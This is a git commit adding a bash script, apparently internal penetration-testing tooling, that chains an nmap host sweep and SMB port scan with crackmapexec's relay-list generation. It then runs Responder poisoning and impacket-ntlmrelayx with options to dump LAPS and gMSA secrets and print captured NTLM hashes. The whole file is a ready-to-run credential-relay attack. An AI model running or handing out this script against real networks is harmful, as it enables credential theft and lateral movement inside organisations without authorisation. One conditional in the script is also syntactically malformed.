eba077f8c5af54ee3e9ff1ed295b5f4bd1f925a5
D F <8780724-Elan0r@users.noreply.gitlab.com>
2021-05-05 12:12:11 +0000

    geklaut von CHO mit if ergänzt

---
+++ dfi/relay.sh
@@ -0,0 +1,96 @@
+#!/bin/bash
+
+echo 'Netze zum scannen in /root/ipint.txt fuer nmap'
+
+if [ -s /root/ipint.txt ]; then
+    echo "ipint.txt ist da."
+else 
+    echo "ipint.txt existiert nicht oder ist leer."
+	exit 1
+fi
+
+if [ -d /root/output/nmap && -d /root/output/list ]; then
+    echo 'Ordner sind da!'
+else    
+    #Creating Output Folders
+    mkdir -p /root/output/nmap /root/output/list
+fi
+
+#NMAP PE SCAN
+if [ -s /root/output/list/ipup.txt ]; then
+echo 'nmap PE bereits gelaufen'
+else
+   echo 'NMAP PE Scan'
+   nmap -PE -sn -n --max-retries 2 --max-hostgroup 20 --scan-delay 1 -oA /root/output/nmap/pe -iL /root/ipint.txt > /dev/null 2>&1
+   echo ''
+   echo 'Done'
+
+   #Piping the IP-Addresses of the Targets to a file
+   awk '/Up/ {print$2}' /root/output/nmap/pe.gnmap > /root/output/list/ipup.txt
+   echo ''
+fi
+
+if [ -s /root/output/list/smb_open.txt ]; then
+   echo 'SMB Open File schon da, weiter mit CME'
+else
+   #NMAP Portscan for port 445
+   echo 'NMAP Portscan 445'
+   nmap -p 445 --max-retries 2 --max-hostgroup 20 --scan-delay 1 -oA /root/output/nmap/445 -iL /root/output/list/ipup.txt > /dev/null 2>&1
+   echo ''
+   echo 'Done'
+
+   #Piping IP's with 445 open to a file
+   awk '/open/ {print$2}' /root/output/nmap/445.gnmap > /root/output/list/smb_open.txt
+   echo ''
+fi
+
+if [ -s /root/output/list/smb_sign_off.txt ]; then
+   echo 'SMB Signing Liste schon da weiter mit Responder unf NTLMRELAY'
+else
+   #Using Crackmap to Check which of the IP's with 445 open have Signing:false
+   echo 'Generating Relay List'
+   crackmapexec smb /root/output/list/smb_open.txt --gen-relay-list /root/output/list/smb_sign_off.txt > /root/output/cme_beauty.txt
+   echo 'Done'
+fi
+
+#When Clients with Signing:false exist
+if [ -s /root/output/list/smb_sign_off.txt ] 
+	then
+	echo ''
+	
+	#Responder with 300sec timeout in bg
+	echo 'Starting Responder'
+	timeout 300 responder -I eth0 -rdwv > /dev/null 2>&1 &
+	echo ''
+	echo 'Done'
+	echo ''
+
+	#NTLMRelayX with 300sec timeout in bg to relay ntlm to hosts without signing enabled
+	echo 'Starting NTLM-Relay'
+	timeout 300 impacket-ntlmrelayx -6 -ts -ra --dump-laps --dump-gmsa -l loot -of /root/output/ntlm_relay_ntlmv2.txt --remove-mic -smb2support -tf /root/output/list/smb_sign_off.txt > /dev/null 2>&1 &
+	echo ''
+
+	#Declaring variables for each PID of Responder and NTLMRelayX
+	echo 'Waiting for Hashes'
+
+	PID_RESPONDER=`jobs -l | awk '/responder/ {print$2}'`
+	PID_RELAY=`jobs -l | awk '/ntlmrelayx/ {print$2}'`
+
+	#Waiting for Jobs to despawn
+	wait $PID_RESPONDER
+	wait $PID_RELAY
+	
+	#When Output-File exists and is not empty
+	if [ -s /root/output/ntlm_relay_ntlmv2.txt ]
+		then
+		#Show me 'dem Hashes
+		cat /root/output/ntlm_relay_ntlmv2.txt
+
+		else
+		echo 'No Hashes Found'
+	fi
+else
+	echo 'Either Signing is ON everywhere or no SMB Service available.'
+fi
+
+
